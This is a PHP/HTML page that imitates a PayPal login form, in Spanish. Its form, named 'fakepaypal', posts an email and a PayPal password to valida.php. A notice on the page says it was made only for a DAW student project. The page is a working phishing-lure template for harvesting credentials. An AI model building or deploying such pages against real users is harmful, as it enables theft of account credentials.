<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN" "http://www.w3.org/TR/html4/loose.dtd">
<?php
session_start()
?>
<html>
<head>
<meta http-equiv="content-type" content="text/html; charset=iso-8859-1" />
<title>PayPal</title>
<meta name="generator" content="WYSIWYG Web Builder 8 - http://www.wysiwygwebbuilder.com">
<style type="text/css">
body
{
   background-color: #FFFFFF;
   color: #000000;
}
</style>
<style type="text/css">
a
{
   color: #0000FF;
   text-decoration: underline;
}
a:visited
{
   color: #800080;
}
a:active
{
   color: #FF0000;
}
a:hover
{
   color: #0000FF;
   text-decoration: underline;
}
</style>
<style type="text/css">
#Image1
{
   border: 0px #000000 solid;
}
#wb_Form1
{
   background-color: #FAFAFA;
   border: 0px #000000 solid;
}
#wb_Text1 
{
   background-color: transparent;
   border: 0px #000000 solid;
   padding: 0;
}
#wb_Text1 div
{
   text-align: left;
}
#Editbox1
{
   border: 1px #C0C0C0 solid;
   background-color: #FFFFFF;
   color :#000000;
   font-family: Arial;
   font-size: 13px;
   text-align: left;
   vertical-align: middle;
}
#wb_Text2 
{
   background-color: transparent;
   border: 0px #000000 solid;
   padding: 0;
}
#wb_Text2 div
{
   text-align: left;
}
#Editbox2
{
   border: 1px #C0C0C0 solid;
   background-color: #FFFFFF;
   color :#000000;
   font-family: Arial;
   font-size: 13px;
   text-align: left;
   vertical-align: middle;
}
#Button1
{
   color: #000000;
   font-family: Arial;
   font-size: 13px;
}
#wb_Text3 
{
   background-color: transparent;
   border: 0px #000000 solid;
   padding: 0;
}
#wb_Text3 div
{
   text-align: left;
}
#wb_Text4 
{
   background-color: transparent;
   border: 0px #000000 solid;
   padding: 0;
}
#wb_Text4 div
{
   text-align: left;
}
</style>
</head>
<body>
<div id="wb_Image1" style="position:absolute;left:468px;top:5px;width:602px;height:168px;z-index:5;">
<img src="images/wwb_img1.jpg" id="Image1" alt="" border="0" style="width:602px;height:168px;"></div>
<div id="wb_Form1" style="position:absolute;left:573px;top:210px;width:369px;height:120px;z-index:6;">
<form name="fakepaypal" method="post" action="valida.php" enctype="application/x-www-form-urlencoded" id="Form1">
<div id="wb_Text1" style="position:absolute;left:10px;top:15px;width:129px;height:16px;z-index:0;text-align:left;">
<span style="color:#000000;font-family:Arial;font-size:13px;">correo electronico</span></div>
<input type="text" id="Editbox1" style="position:absolute;left:149px;top:15px;width:198px;height:23px;line-height:23px;z-index:1;" name="Editbox1" value="">
<div id="wb_Text2" style="position:absolute;left:10px;top:45px;width:129px;height:16px;z-index:2;text-align:left;">
<span style="color:#000000;font-family:Arial;font-size:13px;">contraseña de paypal</span></div>
<input type="password" id="Editbox2" style="position:absolute;left:149px;top:45px;width:198px;height:23px;line-height:23px;z-index:3;" name="Editbox2" value="">
<input type="submit" id="Button1" name="" value="Submit" style="position:absolute;left:149px;top:75px;width:96px;height:25px;z-index:4;">
</form>
</div>
<div id="wb_Text3" style="position:absolute;left:468px;top:692px;width:578px;height:16px;z-index:7;text-align:left;">
<span style="color:#000000;font-family:Arial;font-size:13px;">ADVERTENCIA: pagina falsa de PayPal hecha exclusivamente para el proyecto de DAW</span></div>
<?
if (isset($_SESSION['error'])){
?>
<div id="wb_Text4" style="position:absolute;left:567px;top:382px;width:451px;height:32px;z-index:8;text-align:left;">
<span style="color:#FF0000;font-family:Arial;font-size:13px;">Informacion de usuario incorrecta y/o no existente. si cree que esto es un error, contacte con PayPal lo antes posibe</span></div>
<?
}
?>
</body>
</html>